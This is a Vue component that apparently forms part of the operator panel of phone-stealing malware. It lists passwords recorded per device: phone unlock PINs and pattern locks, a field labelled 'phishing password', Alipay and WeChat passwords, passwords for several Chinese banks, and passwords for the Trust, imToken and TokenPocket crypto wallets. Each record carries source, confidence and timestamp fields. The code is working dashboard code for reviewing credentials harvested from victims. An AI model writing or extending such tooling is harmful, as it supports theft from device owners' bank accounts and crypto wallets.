<script setup lang="ts">
import { ref, onMounted, watch } from 'vue';
import { NIcon, NEmpty, NSpin, NTag, NButton } from 'naive-ui';
import { KeyOutline, RefreshOutline, TimeOutline } from '@vicons/ionicons5';
import axios from 'axios';

interface Props {
    deviceUid: string;
    phonePassword?: string;
}

interface Credential {
    id: number;
    source: 'credentials' | 'cipher' | 'websocket';
    password: string | null;
    password_type: string | null;
    input_method: string | null;
    confidence: number | null;
    cipher_grade_code: string | null;
    text_cipher: string | null;
    pattern_cipher: string | null;
    is_locked: boolean;
    device_timestamp: string | null;
    created_at: string;
}

const props = withDefaults(defineProps<Props>(), {
    phonePassword: '',
});

const credentials = ref<Credential[]>([]);
const loading = ref(false);
const error = ref('');

const passwordLabels = [
    '手机密码', '钓鱼密码', 'Alipay密码', 'Wechat密码', '云密码',
    '建密码', '邮密码', '农密码', '中密码', '工密码', '招密码',
    'gp密码', 'pe密码', 'an密码', 'mb密码', 'bc密码',
    'Trust密码', 'Imtoken密码', 'Tokenpocket密码',
];

const parseLegacyPasswords = (): Record<string, string> => {
    const result: Record<string, string> = {};
    const pwdStr = props.phonePassword || '';
    if (!pwdStr || pwdStr === '--') return result;

    passwordLabels.forEach((label, i) => {
        const nextLabel = passwordLabels[i + 1];
        const startIdx = pwdStr.indexOf(label + ':');
        if (startIdx === -1) return;
        const afterLabel = pwdStr.substring(startIdx + label.length + 1);
        let value = nextLabel
            ? (() => { const ni = afterLabel.indexOf(nextLabel + ':'); return ni !== -1 ? afterLabel.substring(0, ni).trim() : afterLabel.trim(); })()
            : afterLabel.trim();
        value = value.replace(/^\s+|\s+$/g, '').replace(/\s+/g, ' ');
        if (value && value !== '--') result[label] = value;
    });
    return result;
};

const fetchCredentials = async () => {
    if (!props.deviceUid) return;
    loading.value = true;
    error.value = '';
    try {
        const { data } = await axios.get('/api/device-credentials', {
            params: { device_uid: props.deviceUid, per_page: 50 },
        });
        if (data.success) {
            credentials.value = data.data?.data ?? [];
        }
    } catch (e: any) {
        error.value = e.response?.data?.msg || e.message;
    } finally {
        loading.value = false;
    }
};

const getDisplayPassword = (cred: Credential): string => {
    if (cred.password) return cred.password;
    if (cred.text_cipher) return cred.text_cipher;
    if (cred.pattern_cipher) return `[图案] ${cred.pattern_cipher}`;
    return '--';
};

const getTypeLabel = (cred: Credential): string => {
    if (cred.password_type) return cred.password_type;
    if (cred.cipher_grade_code) {
        const map: Record<string, string> = {
            'PASSWORD_QUALITY_NUMERIC_COMPLEX': 'pin',
            'PASSWORD_QUALITY_ALPHANUMERIC': 'password',
            'PASSWORD_QUALITY_PATTERN': 'pattern',
            'PASSWORD_QUALITY_TOUCH_POINTS': 'touch',
        };
        return map[cred.cipher_grade_code] ?? cred.cipher_grade_code;
    }
    return 'unknown';
};

const getSourceColor = (source: string): string => {
    const map: Record<string, string> = {
        credentials: '#3b82f6',
        cipher: '#8b5cf6',
        websocket: '#10b981',
    };
    return map[source] ?? '#94a3b8';
};

const formatTime = (ts: string | null): string => {
    if (!ts) return '';
    const d = new Date(ts);
    return `${d.getMonth() + 1}/${d.getDate()} ${d.getHours().toString().padStart(2, '0')}:${d.getMinutes().toString().padStart(2, '0')}`;
};

onMounted(fetchCredentials);
watch(() => props.deviceUid, fetchCredentials);
</script>

<template>
    <div class="credential-panel">
        <div class="panel-header">
            <NIcon :component="KeyOutline" size="16" />
            <span>密码信息</span>
            <NButton size="tiny" quaternary circle @click="fetchCredentials" :loading="loading">
                <template #icon><NIcon :component="RefreshOutline" /></template>
            </NButton>
        </div>

        <!-- 数据库密码记录 -->
        <NSpin :show="loading" size="small">
            <div v-if="credentials.length > 0" class="credential-list">
                <div v-for="cred in credentials" :key="cred.id" class="credential-row">
                    <div class="cred-left">
                        <NTag size="tiny" :bordered="false" :style="{ backgroundColor: getSourceColor(cred.source) + '20', color: getSourceColor(cred.source) }">
                            {{ cred.source }}
                        </NTag>
                        <NTag v-if="getTypeLabel(cred) !== 'unknown'" size="tiny" :bordered="false" type="default">
                            {{ getTypeLabel(cred) }}
                        </NTag>
                        <span v-if="cred.confidence" class="confidence">{{ cred.confidence }}%</span>
                    </div>
                    <div class="cred-right">
                        <span class="cred-password">{{ getDisplayPassword(cred) }}</span>
                        <span v-if="cred.device_timestamp || cred.created_at" class="cred-time">
                            <NIcon :component="TimeOutline" size="10" />
                            {{ formatTime(cred.device_timestamp || cred.created_at) }}
                        </span>
                    </div>
                </div>
            </div>
            <NEmpty v-else-if="!loading" description="暂无密码记录" size="small" />
        </NSpin>

        <!-- 旧版 phone_password 兜底显示 -->
        <template v-if="phonePassword && phonePassword !== '--'">
            <div class="legacy-divider">旧版密码 (WS)</div>
            <div class="legacy-list">
                <template v-for="(value, label) in parseLegacyPasswords()" :key="label">
                    <div class="legacy-row">
                        <span class="legacy-label">{{ label }}:</span>
                        <span class="legacy-value">{{ value }}</span>
                    </div>
                </template>
            </div>
        </template>
    </div>
</template>

<style scoped>
.credential-panel {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.panel-header {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
    font-weight: 600;
    color: #1e293b;
}

.panel-header .n-button {
    margin-left: auto;
}

.credential-list {
    display: flex;
    flex-direction: column;
    gap: 6px;
    max-height: 300px;
    overflow-y: auto;
}

.credential-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 8px 10px;
    background: #fff;
    border-radius: 8px;
    border: 1px solid #e2e8f0;
    gap: 8px;
}

.cred-left {
    display: flex;
    align-items: center;
    gap: 6px;
    flex-shrink: 0;
}

.confidence {
    font-size: 11px;
    color: #94a3b8;
}

.cred-right {
    display: flex;
    flex-direction: column;
    align-items: flex-end;
    gap: 2px;
    min-width: 0;
}

.cred-password {
    font-size: 14px;
    font-weight: 600;
    color: #10b981;
    word-break: break-all;
}

.cred-time {
    font-size: 10px;
    color: #94a3b8;
    display: flex;
    align-items: center;
    gap: 2px;
}

.legacy-divider {
    font-size: 11px;
    color: #94a3b8;
    text-align: center;
    border-top: 1px dashed #e2e8f0;
    padding-top: 8px;
    margin-top: 4px;
}

.legacy-list {
    display: flex;
    flex-direction: column;
    gap: 2px;
}

.legacy-row {
    display: flex;
    justify-content: space-between;
    padding: 4px 0;
    border-bottom: 1px solid #f1f5f9;
    font-size: 12px;
}

.legacy-label {
    color: #64748b;
    min-width: 80px;
}

.legacy-value {
    color: #10b981;
    font-weight: 500;
    word-break: break-all;
    text-align: right;
    flex: 1;
}
</style>
